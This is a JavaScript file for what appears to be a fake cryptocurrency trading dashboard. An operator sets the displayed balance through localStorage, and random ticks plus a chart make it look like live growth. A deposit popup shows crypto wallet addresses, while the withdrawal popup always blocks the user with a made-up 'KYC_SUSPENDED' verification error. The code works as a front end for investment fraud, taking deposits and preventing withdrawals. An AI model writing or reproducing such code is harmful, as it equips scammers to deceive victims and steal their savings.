document.addEventListener('DOMContentLoaded', () => {
    // --- CONFIGURATION MANAGEMENT ---
    let currentBalance = parseFloat(localStorage.getItem('admin_balance')) || 1000.00;
    
    // Set up your different coin addresses here!
    let cryptoAddresses = {
        'USDT (TRC20)': localStorage.getItem('admin_address') || "0x71C...3a94",
        'Bitcoin (BTC)': "1BitcoinAddressGoesHere",
        'Ethereum (ETH)': "0xEthereumAddressGoesHere"
    };
    
    let activeMethod = 'USDT (TRC20)';

    function updateBalanceDisplay() {
        const display = document.getElementById('balance-display');
        if (display) {
            display.innerText = '$' + currentBalance.toFixed(2);
        }
    }

    updateBalanceDisplay();

    // --- HELPER TO CLOSE POPUPS ---
    window.closeCustomModal = function(modalId) {
        const modal = document.getElementById(modalId);
        if (modal) modal.remove();
    };

    // --- FUNCTION TO SWAP COINS INSIDE DEPOSIT MODAL ---
    window.selectDepositCoin = function(coinName) {
        activeMethod = coinName;
        
        // Update the borders visually to show which one is selected
        ['USDT (TRC20)', 'Bitcoin (BTC)', 'Ethereum (ETH)'].forEach(method => {
            const row = document.getElementById(`row-${method}`);
            if (row) {
                if (method === coinName) {
                    row.style.border = '1px solid #10b981';
                    row.style.opacity = '1';
                } else {
                    row.style.border = '1px solid #334155';
                    row.style.opacity = '0.6';
                }
            }
        });

        // Instantly swap the address box text below the list
        const addressTitle = document.getElementById('deposit-address-title');
        const addressText = document.getElementById('deposit-address-text');
        
        if (addressTitle) addressTitle.innerText = `Deposit Address (${coinName})`;
        if (addressText) addressText.innerText = cryptoAddresses[coinName];
    };

    // --- QUICK DEPOSIT POPUP (FULLY INTERACTIVE) ---
    window.triggerDepositModal = function() {
        closeCustomModal('dynamicDepositModal');

        const modalHtml = `
            <div id="dynamicDepositModal" style="position:fixed; top:0; left:0; width:100%; height:100%; backgroundColor:rgba(15,23,42,0.85); display:flex; justify-content:center; align-items:center; z-index:9999; backdrop-filter:blur(4px); font-family:sans-serif;">
                <div style="background-color:#1e293b; border:1px solid #334155; padding:24px; border-radius:12px; width:90%; max-width:400px; color:#f8fafc; box-shadow:0 20px 25px -5px rgba(0,0,0,0.5);">
                    <div style="display:flex; justify-content:between; align-items:center; margin-bottom:20px;">
                        <h3 style="margin:0; font-size:18px; font-weight:600;">Quick Deposit</h3>
                        <button onclick="closeCustomModal('dynamicDepositModal')" style="background:none; border:none; color:#94a3b8; font-size:20px; cursor:pointer;">&times;</button>
                    </div>
                    
                    <p style="font-size:14px; color:#94a3b8; margin-bottom:16px;">Select your preferred payment method:</p>
                    
                    <div style="display:flex; flex-direction:column; gap:10px; margin-bottom:20px;">
                        <div id="row-USDT (TRC20)" onclick="selectDepositCoin('USDT (TRC20)')" style="display:flex; align-items:center; background-color:#0f172a; padding:12px; border-radius:8px; border:1px solid #10b981; cursor:pointer; transition: 0.2s;">
                            <span style="font-size:20px; margin-right:12px;">🟢</span>
                            <div>
                                <div style="font-weight:600; font-size:14px;">USDT (TRC20)</div>
                                <div style="font-size:12px; color:#64748b;">Stablecoin Network</div>
                            </div>
                        </div>
                        <div id="row-Bitcoin (BTC)" onclick="selectDepositCoin('Bitcoin (BTC)')" style="display:flex; align-items:center; background-color:#0f172a; padding:12px; border-radius:8px; border:1px solid #334155; opacity:0.6; cursor:pointer; transition: 0.2s;">
                            <span style="font-size:20px; margin-right:12px;">🪙</span>
                            <div>
                                <div style="font-weight:600; font-size:14px;">Bitcoin (BTC)</div>
                                <div style="font-size:12px; color:#64748b;">Mainnet Network</div>
                            </div>
                        </div>
                        <div id="row-Ethereum (ETH)" onclick="selectDepositCoin('Ethereum (ETH)')" style="display:flex; align-items:center; background-color:#0f172a; padding:12px; border-radius:8px; border:1px solid #334155; opacity:0.6; cursor:pointer; transition: 0.2s;">
                            <span style="font-size:20px; margin-right:12px;">🔷</span>
                            <div>
                                <div style="font-weight:600; font-size:14px;">Ethereum (ETH)</div>
                                <div style="font-size:12px; color:#64748b;">ERC20 Network</div>
                            </div>
                        </div>
                    </div>

                    <div style="background-color:#0f172a; padding:12px; border-radius:8px; border:1px solid #334155; word-break:break-all;">
                        <div id="deposit-address-title" style="font-size:11px; color:#64748b; text-transform:uppercase; margin-bottom:4px;">Deposit Address (${activeMethod})</div>
                        <div id="deposit-address-text" style="font-family:monospace; font-size:13px; color:#10b981;">${cryptoAddresses[activeMethod]}</div>
                    </div>
                    
                    <p style="font-size:11px; color:#64748b; text-align:center; margin-top:16px; margin-bottom:0;">Funds will credit automatically after network confirmations.</p>
                </div>
            </div>
        `;
        document.body.insertAdjacentHTML('beforeend', modalHtml);
        
        // Ensure the visual state matches current active selection when opening
        selectDepositCoin(activeMethod);
    };

    // --- WITHDRAW FUNDS POPUP WITH VERIFICATION PANEL ---
    window.triggerWithdrawalModal = function() {
        closeCustomModal('dynamicWithdrawModal');

        const modalHtml = `
            <div id="dynamicWithdrawModal" style="position:fixed; top:0; left:0; width:100%; height:100%; backgroundColor:rgba(15,23,42,0.85); display:flex; justify-content:center; align-items:center; z-index:9999; backdrop-filter:blur(4px); font-family:sans-serif;">
                <div style="background-color:#1e293b; border:1px solid #334155; padding:24px; border-radius:12px; width:90%; max-width:400px; color:#f8fafc; box-shadow:0 20px 25px -5px rgba(0,0,0,0.5); text-align:center;">
                    <div style="display:flex; justify-content:end; margin-bottom:4px;">
                        <button onclick="closeCustomModal('dynamicWithdrawModal')" style="background:none; border:none; color:#94a3b8; font-size:20px; cursor:pointer;">&times;</button>
                    </div>
                    
                    <div style="font-size:48px; margin-bottom:16px;">⚠️</div>
                    <h3 style="margin:0 0 8px 0; font-size:20px; font-weight:600; color:#ef4444;">Verification Required</h3>
                    <p style="font-size:14px; color:#94a3b8; line-height:1.5; margin-bottom:20px;">Your withdrawal requests are currently locked. To safeguard assets, identity verification protocol must be completed.</p>
                    
                    <div style="background-color:#0f172a; border:1px solid #ef4444; padding:12px; border-radius:8px; font-size:13px; color:#fca5a5; text-align:left; margin-bottom:20px; font-family:monospace;">
                        ERROR_CODE: 0x884F2<br>
                        STATUS: KYC_SUSPENDED
                    </div>

                    <button onclick="closeCustomModal('dynamicWithdrawModal')" style="width:100%; background-color:#ef4444; color:white; border:none; padding:12px; border-radius:8px; font-weight:600; cursor:pointer;">Complete Verification</button>
                </div>
            </div>
        `;
        document.body.insertAdjacentHTML('beforeend', modalHtml);
    };

    // --- CHART INITIALIZATION ---
    const chartElement = document.getElementById('LivePerformanceChart');
    if (!chartElement) return;
    const ctx = chartElement.getContext('2d');

    const greenColor = 'rgba(16, 185, 129, 1)';
    const greenGradientStart = 'rgba(16, 185, 129, 0.24)';
    const redColor = 'rgba(239, 68, 68, 1)';
    const redGradientStart = 'rgba(239, 68, 68, 0.24)';

    function getChartGradient(colorStart) {
        let gradient = ctx.createLinearGradient(0, 0, 0, 300);
        gradient.addColorStop(0, colorStart);
        gradient.addColorStop(1, 'rgba(0, 0, 0, 0.0)');
        return gradient;
    }

    const liveChart = new Chart(ctx, {
        type: 'line',
        data: {
            labels: ['00:00', '04:00', '08:00', '12:00', '16:00', '20:00'],
            datasets: [{
                label: 'Portfolio Value (USDT)',
                data: [
                    currentBalance * 0.992, 
                    currentBalance * 0.995, 
                    currentBalance * 0.991, 
                    currentBalance * 0.997, 
                    currentBalance * 0.994, 
                    currentBalance
                ],
                borderColor: greenColor,
                borderWidth: 3,
                fill: true,
                backgroundColor: getChartGradient(greenGradientStart),
                tension: 0.4
            }]
        },
        options: {
            responsive: true,
            maintainAspectRatio: false,
            plugins: { legend: { display: false } }
        }
    });

    // --- TICK LOOP ---
    setInterval(() => {
        const controlledBalance = parseFloat(localStorage.getItem('admin_balance'));
        const pctChange = (Math.random() * 0.3 - 0.15) / 100;
        const previousBalance = currentBalance;
        
        if (!isNaN(controlledBalance) && controlledBalance !== parseFloat(localStorage.getItem('_last_processed_controlled'))) {
            currentBalance = controlledBalance;
            localStorage.setItem('_last_processed_controlled', controlledBalance);
        } else {
            currentBalance = currentBalance * (1 + pctChange);
        }

        liveChart.data.datasets[0].data = [
            currentBalance * 0.992, 
            currentBalance * 0.995, 
            currentBalance * 0.991, 
            currentBalance * 0.997, 
            currentBalance * 0.994, 
            currentBalance
        ];
        
        updateBalanceDisplay();

        if (currentBalance >= previousBalance) {
            liveChart.data.datasets[0].borderColor = greenColor;
            liveChart.data.datasets[0].backgroundColor = getChartGradient(greenGradientStart);
        } else {
            liveChart.data.datasets[0].borderColor = redColor;
            liveChart.data.datasets[0].backgroundColor = getChartGradient(redGradientStart);
        }

        liveChart.update('none'); 
    }, 3000); 
});
